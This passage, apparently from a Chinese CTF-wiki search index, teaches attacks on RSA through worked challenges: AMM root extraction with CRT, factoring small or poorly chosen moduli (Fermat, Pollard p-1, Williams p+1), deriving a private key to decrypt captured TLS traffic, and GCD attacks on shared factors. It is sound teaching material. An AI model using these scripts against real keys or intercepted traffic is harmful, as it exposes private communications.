m^e &amp;\\equiv c \\quad (\\text{mod}\\ q) \\end{aligned}  <p>\u7136\u540e\u5206\u522b\u5728<code>GF(p)</code>\u548c<code>GF(q)</code>\u4e0a\u5bf9<code>c</code>\u5f00<code>e=0x1337</code>\u6b21\u65b9\u6839\uff0c\u518d\u7528<code>CRT</code>\u7ec4\u5408\u4e00\u4e0b\u5373\u53ef\u5f97\u5230\u5728<code>mod n</code>\u4e0b\u7684\u89e3\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#exp","title":"EXP","text":"<ul> <li>\u5148\u7528<code>Adleman-Manders-Miller rth Root Extraction Method</code>\u5728<code>GF(p)</code>\u548c<code>GF(q)</code>\u4e0a\u5bf9<code>c</code>\u5f00<code>e</code>\u6b21\u6839\uff0c\u5206\u522b\u5f97\u5230\u4e00\u4e2a\u89e3\u3002\u5927\u6982\u4e0d\u523010\u79d2\u3002</li> <li>\u7136\u540e\u53bb\u627e\u5230\u6240\u6709\u7684<code>0x1336</code>\u4e2a<code>primitive nth root of 1</code>\uff0c\u4e58\u4ee5\u4e0a\u9762\u90a3\u4e2a\u89e3\uff0c\u5f97\u5230\u6240\u6709\u7684<code>0x1337</code>\u4e2a\u89e3\u3002\u5927\u69821\u5206\u949f\u3002</li> <li>\u518d\u7528<code>CRT</code>\u5bf9<code>GF(p)</code>\u548c<code>GF(q)</code>\u4e0a\u7684\u4e24\u7ec4<code>0x1337</code>\u4e2a\u89e3\u7ec4\u5408\u6210<code>mod n</code>\u4e0b\u7684\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230<code>0x1337**2==24196561</code>\u4e2a<code>mod n</code>\u7684\u89e3\u3002\u6700\u540e\u80fd\u901a\u8fc7<code>check</code>\u7684\u5373\u4e3a<code>flag</code>\u3002\u5927\u6982\u5341\u51e0\u5206\u949f\u3002</li> </ul> <p><code>exp.sage</code>\u5982\u4e0b\uff0c\u9700\u8981\u5341\u51e0\u5206\u949f\uff1a</p> <p>\u5df2\u4fee\u6539\u6210python3\u7248\u672c\uff0c\u5728\u522b\u7684\u9898\u76ee\u4f7f\u7528\u65f6\u9700\u8981\u4fee\u6539RSA\u76f8\u5173\u6570\u636e\u4ee5\u53ca<code>check</code>\u51fd\u6570</p> <pre><code>import random\nimport time\n\n# About 3 seconds to run\ndef AMM(o, r, q):\n    start = time.time()\n    print('\\n----------------------------------------------------------------------------------')\n    print('Start to run Adleman-Manders-Miller Root Extraction Method')\n    print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q))\n    g = GF(q)\n    o = g(o)\n    p = g(random.randint(1, q))\n    while p ^ ((q-1) // r) == 1:\n        p = g(random.randint(1, q))\n    print('[+] Find p:{}'.format(p))\n    t = 0\n    s = q - 1\n    while s % r == 0:\n        t += 1\n        s = s // r\n    print('[+] Find s:{}, t:{}'.format(s, t))\n    k = 1\n    while (k * s + 1) % r != 0:\n        k += 1\n    alp = (k * s + 1) // r\n    print('[+] Find alp:{}'.format(alp))\n    a = p ^ (r**(t-1) * s)\n    b = o ^ (r*alp - 1)\n    c = p ^ s\n    h = 1\n    for i in range(1, t):\n        d = b ^ (r^(t-1-i))\n        if d == 1:\n            j = 0\n        else:\n            print('[+] Calculating DLP...')\n            j = - dicreat_log(a, d)\n            print('[+] Finish DLP...')\n        b = b * (c^r)^j\n        h = h * c^j\n        c = c ^ r\n    result = o^alp * h\n    end = time.time()\n    print(\"Finished in {} seconds.\".format(end - start))\n    print('Find one solution: {}'.format(result))\n    return result\n\ndef findAllPRoot(p, e):\n    print(\"Start to find all the Primitive {:#x}th root of 1 modulo {}.\".format(e, p))\n    start = time.time()\n    proot = set()\n    while len(proot) &lt; e:\n        proot.add(pow(random.randint(2, p-1), (p-1)//e, p))\n    end = time.time()\n    print(\"Finished in {} seconds.\".format(end - start))\n    return proot\n\ndef findAllSolutions(mp, proot, cp, p):\n    print(\"Start to find all the {:#x}th root of {} modulo {}.\".format(e, cp, p))\n    start = time.time()\n    all_mp = set()\n    for root in proot:\n        mp2 = mp * root % p\n        assert(pow(mp2, e, p) == cp)\n        all_mp.add(mp2)\n    end = time.time()\n    print(\"Finished in {} seconds.\".format(end - start))\n    return all_mp\n\n\nc = 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359\ne = 0x1337\np = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059\nq = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741\n\ncp = c % p\ncq = c % q\nmp = AMM(cp, e, p)\nmq = AMM(cq, e, q)\np_proot = findAllPRoot(p, e)\nq_proot = findAllPRoot(q, e)\nmps = findAllSolutions(mp, p_proot, cp, p)\nmqs = findAllSolutions(mq, q_proot, cq, q)\nprint(mps, mqs)\n\ndef check(m):\n    h = m.hex()\n    if len(h) &amp; 1:\n        return False\n    try:\n        tmp = bytearray.fromhex(h).decode('utf-8')\n    except:\n        return False\n    if tmp.startswith('NCTF'):\n        print(tmp)\n        return True\n    else:\n        return False\n\n\n# About 16 mins to run 0x1337^2 == 24196561 times CRT\nstart = time.time()\nprint('Start CRT...')\nfor mpp in mps:\n    for mqq in mqs:\n        solution = CRT_list([int(mpp), int(mqq)], [p, q])\n        if check(solution):\n            print(solution)\n            exit(0)\n    print(time.time() - start)\n\nend = time.time()\nprint(\"Finished in {} seconds.\".format(end - start))\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/","title":"\u6a21\u6570\u76f8\u5173\u653b\u51fb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#n","title":"\u66b4\u529b\u5206\u89e3 N","text":""},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_2","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u5728 N \u7684\u6bd4\u7279\u4f4d\u6570\u5c0f\u4e8e 512 \u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u91c7\u7528\u5927\u6574\u6570\u5206\u89e3\u7684\u7b56\u7565\u83b7\u53d6 p \u548c q\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#jarvisoj-easy-rsa","title":"JarvisOJ - Easy RSA","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 \"JarvisOJ - Easy RSA\" \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u5982\u4e0b</p> <p>\u8fd8\u8bb0\u5f97 veryeasy RSA \u5417\uff1f\u662f\u4e0d\u662f\u4e0d\u96be\uff1f\u90a3\u7ee7\u7eed\u6765\u770b\u770b\u8fd9\u9898\u5427\uff0c\u8fd9\u9898\u4e5f\u4e0d\u96be\u3002 \u5df2\u77e5\u4e00\u6bb5 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u4e3a\uff1a0xdc2eeeb2782c \u4e14\u5df2\u77e5\u52a0\u5bc6\u6240\u7528\u7684\u516c\u94a5\uff1a N=322831561921859 e = 23 \u8bf7\u89e3\u5bc6\u51fa\u660e\u6587\uff0c\u63d0\u4ea4\u65f6\u8bf7\u5c06\u6570\u5b57\u8f6c\u5316\u4e3a ascii \u7801\u63d0\u4ea4 \u6bd4\u5982\u4f60\u89e3\u51fa\u7684\u660e\u6587\u662f 0x6162\uff0c\u90a3\u4e48\u8bf7\u63d0\u4ea4\u5b57\u7b26\u4e32 ab \u63d0\u4ea4\u683c\u5f0f\uff1a<code>PCTF{\u660e\u6587\u5b57\u7b26\u4e32}</code></p> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684 N \u6bd4\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 factordb \u8fdb\u884c\u5206\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230</p>  322831561921859 = 13574881 \\times 23781539  <p>\u8fdb\u800c\u6211\u4eec\u7b80\u5355\u7f16\u5199\u7a0b\u5e8f\u5982\u4e0b</p> <pre><code>import gmpy2\np = 13574881\nq = 23781539\nn = p * q\ne = 23\nc = 0xdc2eeeb2782c\nphin = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phin)\np = gmpy2.powmod(c, d, n)\ntmp = hex(p)\nprint tmp, tmp[2:].decode('hex')\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b</p> <pre><code>\u279c  Jarvis OJ-Basic-easyRSA git:(master) \u2717 python exp.py\n0x33613559 3a5Y\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#pq-n","title":"p\u548cq\u9009\u53d6\u4e0d\u5f53\u65f6\u5206\u89e3 N","text":""},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_3","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u5f53 RSA \u4e2d p \u548c q \u9009\u53d6\u4e0d\u5f53\u65f6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-q","title":"|p-q| \u5f88\u5927","text":"<p>\u5f53 p-q \u5f88\u5927\u65f6\uff0c\u4e00\u5b9a\u5b58\u5728\u67d0\u4e00\u4e2a\u53c2\u6570\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u4e3a p\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7a77\u4e3e\u7684\u65b9\u6cd5\u5bf9\u6a21\u6570\u8fdb\u884c\u8bd5\u9664\uff0c\u4ece\u800c\u5206\u89e3\u6a21\u6570\uff0c\u5f97\u5230\u4fdd\u5bc6\u53c2\u6570\u4e0e\u660e\u6587\u4fe1\u606f\u3002\u57fa\u672c\u6765\u8bf4\uff0c\u4e0d\u600e\u4e48\u53ef\u884c\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-q_1","title":"|p-q| \u8f83\u5c0f","text":"<p>\u9996\u5148</p>  \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4}  <p>\u65e2\u7136 |p-q| \u8f83\u5c0f\uff0c\u90a3\u4e48 \\frac{(p-q)^2}{4} \u81ea\u7136\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u8fdb\u800c \\frac{(p+q)^2}{4} \u53ea\u662f\u6bd4 N \u7a0d\u5fae\u5927\u4e00\u70b9\uff0c\u6240\u4ee5 \\frac{p+q}{2} \u4e0e \\sqrt{n} \u76f8\u8fd1\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u6cd5\u6765\u5206\u89e3</p> <ul> <li>\u987a\u5e8f\u68c0\u67e5 \\sqrt{n} \u7684\u6bcf\u4e00\u4e2a\u6574\u6570 x\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a x \u4f7f\u5f97 x^2-n \u662f\u5e73\u65b9\u6570\uff0c\u8bb0\u4e3a y^2</li> <li>\u90a3\u4e48 x^2-n=y^2\uff0c\u8fdb\u800c\u6839\u636e\u5e73\u65b9\u5dee\u516c\u5f0f\u5373\u53ef\u5206\u89e3 N</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-1","title":"p - 1 \u5149\u6ed1","text":"<p>\u5f53 p \u662f N \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p - 1 \u662f\u5149\u6ed1\uff08p - 1 \u662f\u591a\u4e2a\u5c0f\u7d20\u6570\u7684\u4e58\u79ef\uff09\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u6765\u5206\u89e3 N\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u53ef\u4ee5\u6210\u529f\u7684\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#nctf-2019childrsa","title":"\u4f8b\u9898 [NCTF 2019]childRSA","text":"<pre><code>from random import choice\nfrom Crypto.Util.number import isPrime, sieve_base as primes\nfrom flag import flag\n# primes\u662f\u4ece2\u5230104729\u7684\u7d20\u6570\u5217\u8868\ndef getPrime(bits):\n    while True:\n        n = 2\n        while n.bit_length() &lt; bits:\n            n *= choice(primes)\n        if isPrime(n + 1):\n            return n + 1\n\ne = 0x10001\nm = int.from_bytes(flag.encode(), 'big')\np, q = [getPrime(2048) for _ in range(2)]\nn = p * q\nc = pow(m, e, n)\n\n# n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513\n# c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108\n</code></pre> <p>\u5206\u89e3n\u7684\u811a\u672c\uff0c\u9700\u8981\u8dd1\u5341\u51e0\u5206\u949f</p> <pre><code>from Crypto.Util.number import *\n\ndef Pollard_p_1(N):\n    a = 2\n    while True:\n        f = a\n        # precompute\n        for n in range(1, 80000):\n            f = pow(f, n, N)\n        for n in range(80000, 104729+1):\n            f = pow(f, n, N)\n            if n % 15 == 0:\n                d = GCD(f-1, N)\n                if 1 &lt; d &lt; N:\n                    return d # \u8fd4\u56de\u503c\u5c31\u662fp\n        print(a)\n        a += 1\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-1_1","title":"p + 1 \u5149\u6ed1","text":"<p>\u5f53 p \u662f n \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p + 1 \u662f\u5149\u6ed1\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528 Williams's p + 1 \u7b97\u6cd5\u6765\u5206\u89e3 N\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u53ef\u4ee5\u6210\u529f\u7684\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#seccon-2017very-smooth","title":"\u4f8b\u9898 [SECCON 2017]very smooth","text":"<p>\u8be5\u7a0b\u5e8f\u7ed9\u4e86\u4e00\u4e2a HTTPS \u52a0\u5bc6\u7684\u6d41\u91cf\u5305\uff0c\u9996\u5148\u4ece\u5176\u4e2d\u62ff\u5230\u8bc1\u4e66</p> <pre><code>\u279c  2017_SECCON_verysmooth git:(master) binwalk -e s.pcap      \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n2292          0x8F4           Certificate in DER format (x509 v3), header length: 4, sequence length: 467\n4038          0xFC6           Certificate in DER format (x509 v3), header length: 4, sequence length: 467\n5541          0x15A5          Certificate in DER format (x509 v3), header length: 4, sequence length: 467\n\n\u279c  2017_SECCON_verysmooth git:(master) ls\ns.pcap  _s.pcap.extracted  very_smooth.zip\n</code></pre> <p>\u8fd9\u91cc\u5206\u522b\u67e5\u770b\u4e09\u4e2a\u8bc1\u4e66\uff0c\u4e09\u4e2a\u6a21\u6570\u90fd\u4e00\u6837\uff0c\u8fd9\u91cc\u53ea\u7ed9\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>\u279c  _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt  -pubkey -text -modulus -noout \n-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy\n8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj\nDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl\nyioxCqbXYIMxGO4NcQIDAQAB\n-----END PUBLIC KEY-----\nCertificate:\n    Data:\n        Version: 1 (0x0)\n        Serial Number: 11640506567126718943 (0xa18b630c7b3099df)\n    Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C=JP, ST=Kawasaki, O=SRL\n        Validity\n            Not Before: Oct  8 02:47:17 2017 GMT\n            Not After : Oct  8 02:47:17 2018 GMT\n        Subject: C=JP, ST=Kawasaki, O=SRL\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                Public-Key: (1024 bit)\n                Modulus:\n                    00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe:\n                    48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0:\n                    c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12:\n                    75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e:\n                    69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0:\n                    2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07:\n                    47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89:\n                    19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a:\n                    a6:d7:60:83:31:18:ee:0d:71\n                Exponent: 65537 (0x10001)\n    Signature Algorithm: sha256WithRSAEncryption\n         78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf:\n         62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3:\n         32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46:\n         f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c:\n         6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96:\n         bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05:\n         e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32:\n         b7:39\nModulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\u6a21\u6570\u53ea\u6709 1024 \u6bd4\u7279\u3002\u800c\u4e14\uff0c\u6839\u636e\u9898\u76ee\u540d very smooth\uff0c\u5e94\u8be5\u662f\u5176\u4e2d\u4e00\u4e2a\u56e0\u5b50\u6bd4\u8f83 smooth\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528 primefac \u5206\u522b\u5c1d\u8bd5 Pollard's p \u2212 1 \u4e0e Williams's p + 1 \u7b97\u6cd5\uff0c\u5982\u4e0b</p> <pre><code>\u279c  _s.pcap.extracted git:(master) python -m primefac -vs -m=p+1  149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n\n149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897: p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\nZ309  =  P155 x P155  =  11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u5f53\u4f7f\u7528 Williams's p + 1 \u7b97\u6cd5\u65f6\uff0c\u5c31\u76f4\u63a5\u5206\u89e3\u51fa\u6765\u4e86\u3002\u6309\u9053\u7406\u8fd9\u4e2a\u56e0\u5b50\u662f p-1 \u4f3c\u4e4e\u66f4\u5149\u6ed1\uff0c\u4f46\u662f\u5374\u5e76\u4e0d\u80fd\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u5206\u89e3\uff0c\u8fd9\u91cc\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5</p> <pre><code>\u279c  _s.pcap.extracted git:(master) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002\n\n1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002: 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823\nZ154  =  P1 x P1 x P2 x P3 x P6 x P142  =  2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823\n\n\u279c  _s.pcap.extracted git:(master) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000: 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5\nZ154  =  P1^185 x P1^62 x P1^97  =  2^185 x 3^62 x 5^97\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u5bf9\u4e8e p-1 \u786e\u5b9e\u6709\u5f88\u591a\u5c0f\u56e0\u5b50\uff0c\u4f46\u662f\u4e2a\u6570\u592a\u591a\uff0c\u8fd9\u5c31\u4f1a\u4f7f\u5f97\u8fdb\u884c\u679a\u4e3e\u7684\u65f6\u5019\u51fa\u73b0\u6307\u6570\u7206\u70b8\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u6ca1\u6709\u5206\u89e3\u51fa\u6765\u3002</p> <p>\u8fdb\u800c\u6839\u636e\u5206\u89e3\u51fa\u6765\u7684\u6570\u6784\u9020\u79c1\u94a5</p> <pre><code>from Crypto.PublicKey import RSA\nimport gmpy2\n\n\ndef main():\n    n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L\n    p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001L\n    q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L\n    e = 65537L\n    priv = RSA.construct((n, e, long(gmpy2.invert(e, (p - 1) * (q - 1)))))\n    open('private.pem', 'w').write(priv.exportKey('PEM'))\n\n\nmain()\n</code></pre> <p>\u6700\u540e\uff0c\u5c06\u79c1\u94a5\u5bfc\u5165\u5230 wireshark \u4e2d\u5373\u53ef\u5f97\u5230\u660e\u6587\uff08Edit -&gt; Preferences -&gt; Protocols -&gt; SSL -&gt; RSA Key List\uff09\u3002</p> <pre><code>&lt;html&gt;\n&lt;head&gt;&lt;title&gt;Very smooth&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;\nAnswer: One of these primes is very smooth.\n&lt;/h1&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_4","title":"\u6269\u5c55","text":"<p>\u5173\u4e8e\u66f4\u591a\u7684\u4e00\u4e9b\u5206\u89e3\u6a21\u6570 N \u7684\u65b9\u6cd5\u53ef\u4ee5\u53c2\u8003 https://en.wikipedia.org/wiki/Integer_factorization\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_5","title":"\u6a21\u4e0d\u4e92\u7d20","text":""},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_6","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u5f53\u5b58\u5728\u4e24\u4e2a\u516c\u94a5\u7684 N \u4e0d\u4e92\u7d20\u65f6\uff0c\u6211\u4eec\u663e\u7136\u53ef\u4ee5\u76f4\u63a5\u5bf9\u8fd9\u4e24\u4e2a\u6570\u6c42\u6700\u5927\u516c\u56e0\u6570\uff0c\u7136\u540e\u76f4\u63a5\u83b7\u5f97 p\uff0cq\uff0c\u8fdb\u800c\u83b7\u5f97\u76f8\u5e94\u7684\u79c1\u94a5\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#sctf-rsa2","title":"SCTF RSA2","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF rsa2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u76f4\u63a5\u6253\u5f00 pcap \u5305\uff0c\u53d1\u73b0\u6709\u4e00\u5806\u7684\u6d88\u606f\uff0c\u5305\u542b N \u548c e\uff0c\u7136\u540e\u8bd5\u4e86\u8bd5\u4e0d\u540c\u7684 N \u662f\u5426\u4e92\u7d20\uff0c\u6211\u8bd5\u4e86\u524d\u4e24\u4e2a</p> <pre><code>import gmpy2\nn1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031\nn2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943\nprint gmpy2.gcd(n1, n2)\n</code></pre> <p>\u7ed3\u679c\u53d1\u73b0\u7adf\u7136\u4e0d\u4e92\u7d20\u3002</p> <pre><code>\u279c  scaf-rsa2 git:(master) \u2717 python exp.py\n122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137\n</code></pre> 